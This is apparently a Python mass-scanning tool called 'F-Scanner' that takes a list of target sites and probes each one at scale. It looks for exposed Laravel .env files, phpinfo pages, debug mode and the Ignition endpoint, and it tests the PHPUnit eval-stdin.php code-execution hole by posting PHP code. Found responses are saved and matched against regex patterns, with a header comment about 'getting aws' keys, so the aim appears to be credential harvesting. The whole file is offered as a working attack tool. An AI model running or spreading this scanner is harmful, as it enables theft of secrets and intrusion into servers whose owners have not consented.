# getting aws and dll from env
# wong galek
import multiprocessing as mp
import re
import ast
import os
import sys
import requests
import json
from urllib3.exceptions import InsecureRequestWarning
from functools import partial

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    regConfig = ast.literal_eval(open('settings.json').read())
except FileNotFoundError:
    print('File settings.json not found')
    sys.exit()

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'})

class Parse:

    def __init__(self, text, url, method):
        self.text = text
        self.url = url
        self.method = method

    def parse(self, foldersave):
        for key, value in regConfig.items():
            if re.search(value[1], self.text):
                print(self.url + ' -> FOUND ' + value[0])
                with open(foldersave + '/' + self.method + key, 'a') as f:
                    f.write(self.url + '\n')
                    f.close()

def is_json(myjson):
    try:
        json.loads(myjson)
        return True
    except:
        return False


class Main:
    def __init__(self, url, folder):
        self.url = url
        self.folder = folder

    def saveTofile(self, filename, text, url, method=''):
        with open(self.folder + '/' + filename, 'a') as f:
            f.write(url + '\n')
        Parse(text, url, method).parse(self.folder)

    def rebuild_url(self, path):
        if self.url[-1] == '/':
            return self.url + path
        else:
            return self.url + '/' + path

    def debug(self):
        method = 'debug_'
        url_ = self.url
        try:
            resp = session.post(
                url_, data={1: 1}, timeout=10, verify=False).text
            if 'APP_KEY' in resp:
                print(self.url + ' -> FOUND LARAVEL DEBUG')
                self.saveTofile('laravel_debug.txt', resp, url_, method)
            else:
                print(self.url + ' -> NOT FOUND LARAVEL DEBUG')
        except:
            pass

    def env(self):
        list_env = ['.env.bak', '.env', 'core/.env', 'public/.env', 'app/.env', 'laravel/core/.env', 'beta/.env', 'config/.env', 'kyc/.env', 'admin/.env', 'prod/.env', 'api/.env', 'tokenlite_app/.env', 'backend/.env', 'env.backup', '.environment', '.envrc', '.envs', '.env~', 'phpinfo', 'php_info', '_profiler/phpinfo', 'phpinfo.php', 'info.php']
        for path in list_env:
            url_ = self.rebuild_url(path)
            try:
                resp = session.get(url_, timeout=10, verify=False).text
                if 'APP_KEY' in resp:
                    print(self.url + ' -> FOUND LARAVEL ENV')
                    self.saveTofile('laravel_env.txt', resp, url_)
                    break
                elif 'phpinfo()' in resp:
                    print(self.url + ' -> FOUND PHPINFO')
                    self.saveTofile('phpinfo.txt', resp, url_)
                    break
                else:
                    if path == list_env[-1]:
                        print(self.url + ' -> NOT FOUND LARAVEL ENV')
            except:
                pass

    def ignition(self):
        url_ = self.rebuild_url('_ignition/execute-solution')
        try:
            resp = session.get(url_, timeout=10, verify=False).text
            if 'The GET method is not supported' in resp:
                print(self.url + ' -> FOUND INGITION')
                self.saveTofile('ignition.txt', resp, url_)
            else:
                print(self.url + ' -> NOT FOUND INGITION')
        except:
            pass

    def phpunit(self):
        url_ = self.rebuild_url('vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
        try:
            head = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
            rawBody = "<?php phpinfo();"
            resp = session.post(url_, headers=head, data=rawBody, timeout=10, verify=False).text
            if 'PHP License as published by the PHP Group' in resp:
                print(self.url + ' -> FOUND PHPUNIT')
                self.saveTofile('phpunit.txt', resp, url_)
            else:
                print(self.url + ' -> NOT FOUND PHPUNIT')
        except:
            pass

def start_(url, foldersave):
    if '://' not in url:
        url = 'https://' + url
    try:
        session.get(url, timeout=7, verify=False)
        main = Main(url, foldersave)
        main.env()
        main.debug()
        main.ignition()
        main.phpunit()
    except:
        print(url + ' -> ERROR')

def main_():
    cpu_count = mp.cpu_count()
    thrit = cpu_count * 5
    print('''F-Scanner v1.0
CPU: %s
Thread: %s
''' % (cpu_count, thrit))
    try:
        list_url = open(input('Url ? ')).read().splitlines()
        threed = input('Thread: ')
        folder = input('Save Folder ? ')
        if folder == '':
            folder = 'Results'
        if not os.path.isdir(folder):
            os.makedirs(folder)
    except FileNotFoundError:
        print('File not found')
        sys.exit()
    pool = mp.Pool(int(threed))
    pool.map_async(partial(start_, foldersave=folder), list_url)
    pool.close()
    pool.join()
    print('\nDone')
    

if __name__ == '__main__':
    main_()
